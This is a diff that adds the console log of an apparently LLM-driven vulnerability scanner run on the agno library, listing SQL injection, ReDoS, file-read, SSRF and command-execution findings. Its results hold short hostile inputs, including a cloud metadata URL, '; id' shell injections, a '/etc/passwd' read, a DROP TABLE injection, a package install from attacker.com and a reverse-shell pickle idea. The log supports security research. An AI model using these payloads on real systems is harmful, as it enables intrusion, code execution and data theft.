+    Evidence: sqli-[1;36m004[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m9[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m40[0m/[1;36m45[0m[1m][0m sqli-[1;36m009[0m [1m([0m_find_paused_executor_run[1m)[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m9[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m41[0m/[1;36m45[0m[1m][0m lfi-[1;36m010[0m [1m([0mpcm_to_wav_bytes[1m)[0m
+    [33m? [0m[1;33m9[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: sqli-[1;36m002[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m8[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m42[0m/[1;36m45[0m[1m][0m lfi-[1;36m011[0m [1m([0mdownload_file[1m)[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: sqli-[1;36m007[0m[33m...[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: sqli-[1;36m006[0m[33m...[0m
+    [33m? [0m[1;33m9[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: sqli-[1;36m003[0m[33m...[0m
+    [33m? [0m[1;33m9[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: sqli-[1;36m005[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m9[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m43[0m/[1;36m45[0m[1m][0m redos-[1;36m012[0m [1m([0mattach_routes[1m)[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m8[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m44[0m/[1;36m45[0m[1m][0m lfi-[1;36m013[0m [1m([0m_get_image_dimensions[1m)[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m8[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+  [1m[[0m[1;36m45[0m/[1;36m45[0m[1m][0m redos-[1;36m014[0m [1m([0m_close_unterminated_fences[1m)[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m8[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+    [33m? [0m[1;33m9[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: redos-[1;36m008[0m[33m...[0m
+    [2m✓ [0m[1;2;36m0[0m[2m/[0m[1;2;36m10[0m[2m — safe[0m
+    Evidence: lfi-[1;36m010[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m13[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: redos-[1;36m012[0m[33m...[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: sqli-[1;36m009[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m4[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m5[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+    [33m? [0m[1;33m10[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: lfi-[1;36m011[0m[33m...[0m
+    [31m⚠ [0m[1;31m9[0m[31m/[0m[1;31m10[0m[31m — [0m[1;31m1[0m[31m [0m[1;31mcontradiction[0m[1;31m([0m[31ms[0m[1;31m)[0m
+    Adversary: lfi-[1;36m013[0m[33m...[0m
+    [33m? [0m[1;33m9[0m[33m/[0m[1;33m10[0m[33m — interesting[0m
+    Evidence: redos-[1;36m014[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m4[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+    [32m✓ not rebutted[0m
+      weak point: The sink function `_get_image_dimensions` at line [1;36m277[0m directly
+opens `image.filepath` without any validation. The data flow from 
+user-controlled API input through `count_tokens` to this sink is plausible, as 
+the code path is reachable via authenticated API endpoints. No sanitization or 
+access control prevents an attacker from setting a malicious filepath. The 
+vulnerability is authentic and exploitable.
+    PoC Agent: lfi-[1;36m013[0m[33m...[0m
+    [33m? pattern match, LLM skeptical [0m[1;33m([0m[1;33m13[0m[33m [0m[1;33mmatch[0m[1;33m([0m[33mes[0m[1;33m)[0m[1;33m)[0m
+    [32m📄 PoC: [0m
+[32m/home/xcy/workSpace/code-agies/pocs/agno/[0m[32mlfi_developer_likely_assumed_image__get[0m
+[32m_image_dimensions.py[0m
+    Evidence: lfi-[1;36m013[0m[33m...[0m
+    [32m✓ evidence found [0m[1;32m([0m[1;32m5[0m[32m [0m[1;32mmatch[0m[1;32m([0m[32mes[0m[1;32m)[0m[1;32m)[0m
+      PoC: [1;36m1[0m. Authenticate and obtain a valid session token.
+[1;36m2[0m. Create a trace [1m([0me.g., via agent execution[1m)[0m with a message containing an image
+object where `filep[33m...[0m
+    Verifying lfi-[1;36m013[0m[33m...[0m
+    [32m✓ verification confirmed[0m
+
+[1mPhase E: Results[0m
+  Blackboard: [1;36m46[0m cached intents, [1;36m242[0m knowledge entries, [1;36m44[0m phase results
+  [31mHigh confidence [0m[1;31m([0m[1;31m37[0m[1;31m)[0m[31m:[0m
+    sqli-[1;36m000[0m: ? — ?
+      
+    sqli-[1;36m001[0m: ? — ?
+      
+    redos-[1;36m002[0m: ? — ?
+      
+    sqli-[1;36m002[0m: ? — ?
+      
+    sqli-[1;36m003[0m: ? — ?
+      
+    sqli-[1;36m003[0m: ? — ?
+      
+    ssrf-[1;36m004[0m: httpx.get — logic_gap
+      [2;4;94mhttp://169.254.169.254/latest/meta-data/[0m
+    sqli-[1;36m004[0m: ? — ?
+      
+    sqli-[1;36m005[0m: ? — ?
+      
+    sqli-[1;36m006[0m: ? — ?
+      
+    sqli-[1;36m007[0m: ? — ?
+      
+    redos-[1;36m008[0m: ? — ?
+      
+    redos-[1;36m009[0m: ? — ?
+      
+    sqli-[1;36m009[0m: ? — ?
+      
+    rce-[1;36m010[0m: pickle.load — logic_gap
+      [2mCreate a malicious pickle file that executes a reverse shell when loaded, [0m
+[2mthen call the function with file_path pointing to that file.[0m
+    rce-[1;36m011[0m: subprocess.run — logic_gap
+      [2mdirectory = [0m[2;32m'; id'[0m[2m or directory = [0m[2;32m'$[0m[2;32m([0m[2;32mid[0m[2;32m)[0m[2;32m'[0m[2m or directory = [0m[2;32m'`id`'[0m
+    lfi-[1;36m011[0m: ? — ?
+      
+    rce-[1;36m012[0m: exec — logic_gap
+      [1;2;35mexec[0m[1;2m([0m[2;32m"import os; os.system[0m[2;32m([0m[2;32m'id'[0m[2;32m)[0m[2;32m"[0m[1;2m)[0m
+    rce-[1;36m013[0m: subprocess.run — logic_gap
+      [2mdirectory = [0m[2;32m'; malicious_command'[0m
+    lfi-[1;36m013[0m: open — logic_gap
+      [2mSend a message with an image object containing [0m[2;33mfilepath[0m[2m=[0m[2;32m'/etc/passwd'[0m[2m. The[0m
+[2mfunction will open and read the first [0m[1;2;36m100[0m[2m bytes of [0m[2;35m/etc/[0m[2;95mpasswd[0m[2m, potentially [0m
+[2mleaking user credentials or system configuration.[0m
+    rce-[1;36m014[0m: ? — ?
+      
+    redos-[1;36m014[0m: ? — ?
+      
+    rce-[1;36m015[0m: exec — logic_gap
+      [2mIf [0m[1;2;35mshlex.quote[0m[1;2m([0m[1;2m)[0m[2m can be bypassed with a newline, payload: [0m
+[2m; malicious_command[0m
+    rce-[1;36m016[0m: ? — ?
+      
+    sqli-[1;36m018[0m: sess.execute — logic_gap
+      [2mIf table_name is [0m[2;32m'users; DROP TABLE users; --'[0m[2m, the ALTER TABLE query [0m
+[2mbecomes: ALTER TABLE [0m[2;32m"public"[0m[2m.[0m[2;32m"users; DROP TABLE users; --"[0m[2m ADD COLUMN [0m
+[2mcontent_hash VARCHAR; which executes the injected DROP command.[0m
+    sqli-[1;36m019[0m: sess.execute — logic_gap
+      [2mAn attacker can set table_name to `users; DROP TABLE users; --` to execute[0m
+[2marbitrary SQL.[0m
+    rce-[1;36m020[0m: subprocess.run — logic_gap
+      [2mdirectory = [0m[2;32m'; malicious_command'[0m
+    rce-[1;36m021[0m: subprocess.run — logic_gap
+      [2mIf an attacker can control the `command` parameter, they can pass a string[0m
+[2mlike [0m[2;32m'malicious_command'[0m[2m which will be executed as a subprocess. However, since [0m
+[2m`[0m[2;33mshell[0m[2m=[0m[2;3;91mFalse[0m[2m` and the string is not split, it will try to execute a program [0m
+[2mnamed [0m[2;32m'malicious_command'[0m[2m which likely fails. To achieve RCE, the attacker would[0m
+[2mneed to find a way to inject arguments or exploit a different sink. The current [0m
+[2mpath is more of a logic flaw than direct RCE, but it could be combined with [0m
+[2mother vulnerabilities.[0m
+    rce-[1;36m022[0m: subprocess.check_call — logic_gap
+      [2mpackage_name = [0m[2;32m'--extra-index-url http://attacker.com malicious_package'[0m
+    rce-[1;36m023[0m: subprocess.check_call — logic_gap
+      [2mpackage_name = [0m[2;32m'--help'[0m[2m or package_name = [0m[2;32m'$[0m[2;32m([0m[2;32mid[0m[2;32m)[0m[2;32m'[0m[2m [0m[1;2m([0m[2mthough [0m[2;33mshell[0m[2m=[0m[2;3;91mFalse[0m[2m [0m
+[2mlimits some shell injection, argument injection is still possible; e.g., [0m
+[2mpackage_name = [0m[2;32m'--[0m[2;32mexec[0m[2;32m=/bin/sh'[0m[2m if uv supports such options[0m[1;2m)[0m[2m.[0m
+    rce-[1;36m024[0m: subprocess.run — logic_gap
+      [2mIf the command parameter is attacker-controlled, e.g., [0m[2;32m'ls; echo pwned'[0m[2m, [0m
+[2mthe shell will execute both commands.[0m
+    rce-[1;36m025[0m: ? — ?
+      
+    rce-[1;36m028[0m: ? — ?
+      
+
+[1mPipeline Complete[0m
+  Target: [35m/tmp/agno/libs/[0m[95magno[0m
+  Model: deepseek-chat
+  Duration: [1;36m275.[0m9s
+  Paths discovered: [1;36m197[0m
+  Slices analyzed: [1;36m45[0m
+  Findings: [1;36m37[0m high, [1;36m8[0m interesting
+  Tokens: [1;36m1[0m,[1;36m066[0m,[1;36m336[0m total [1m([0m[1;36m977[0m,[1;36m360[0m prompt + [1;36m88[0m,[1;36m976[0m completion[1m)[0m
+
+  [1mRecommended verification targets:[0m
+    SQLI sqli-[1;36m000[0m: Code-level pattern evidence [1m([0m[1;36m7[0m matches[1m)[0m: ?:Execute the 
+workflow agent in streaming or non-streaming 
+    SQLI sqli-[1;36m001[0m: Code-level pattern evidence [1m([0m[1;36m9[0m matches[1m)[0m: ?:Execute the 
+workflow agent in streaming or non-streaming 
+    REDOS redos-[1;36m002[0m: Code-level pattern evidence [1m([0m[1;36m1[0m matches[1m)[0m: ?:return 
+[1;35mbool[0m[1m([0m[1;35mre.match[0m[1m([0mr"^\+[1m[[0m[1;36m1[0m-[1;36m9[0m[1m][0m\d[1m{[0m[1;36m1[0m,[1;36m14[0m[1m}[0m$", phone[1m)[0m[1m)[0m
+    SQLI sqli-[1;36m002[0m: Code-level pattern evidence [1m([0m[1;36m8[0m matches[1m)[0m: ?:[32m"  ├─ [0m
+[32mTool.execute\n"[0m; ?:[32m""[0m"Execute workflow in backgroun
+    SQLI sqli-[1;36m003[0m: Code-level pattern evidence [1m([0m[1;36m9[0m matches[1m)[0m: ?:[1;36m1[0m. Execute 
+pre-hooks; ?:# [1;36m1[0m. Execute pre-hooks; ?:# Execu
+Done
